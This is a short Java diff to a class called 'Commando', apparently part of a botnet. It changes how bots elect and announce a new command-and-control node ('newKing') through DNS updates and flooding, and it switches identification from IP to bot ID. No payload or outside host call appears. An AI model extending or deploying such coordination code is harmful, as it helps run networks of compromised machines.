@@ -86,7 +86,7 @@ public class Commando {
 
 		// non necessario
 		// nServ.updateDnsInformation();
-		newKing = "";
+		newKing = nServ.getIdHash();
 		pServ.initP2P();
 		System.out.println("peer to peer fatto");
 		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
@@ -230,14 +230,16 @@ public class Commando {
 
 	public boolean abdicate() {
 
-		System.out.println("dns nk");
-		Bot b = bServ.searchBotIP(newKing);
+		System.out.println("dns updating..");
+		Bot b = bServ.searchBotId(newKing);
 		if (b != null) {
 			System.out.println("bot dns" + b.getIp());
-			IP ip = new IP(newKing);
+			IP ip = new IP(b.getIp());
 			String pk = b.getPubKey();
 			newKingDns(ip, pk);
 			newKingFlood(ip, pk);
+			System.out.println("dns updated..");
+
 			// TODO DropDATABASE
 			return true;
 		}
@@ -276,7 +278,7 @@ public class Commando {
 				String ip = ccList.get((int) Math.ceil(Math.random() * (ccList.size() - 1)));
 				System.out.println("ho eletto " + ip);
 				if (ccReq.becameCc(ip)) {
-					newKing = ip;
+					newKing = bServ.searchBotIP(ip).getIdBot();
 				}
 				System.out.println("erection completed ");
 			} else
